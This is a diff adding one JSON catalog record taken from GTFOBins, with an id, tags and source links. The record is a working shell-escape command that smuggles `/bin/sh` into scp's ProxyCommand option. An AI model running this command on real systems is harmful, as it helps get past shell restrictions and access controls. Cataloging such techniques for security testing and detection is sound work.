@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-scp-shell-2",
+  "name": "GTFOBins · scp (shell) #2",
+  "command": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:",
+  "description": "Use scp to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "scp",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/scp/#shell",
+  "upstream_id": "scp/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/scp/"
+    }
+  ]
+}
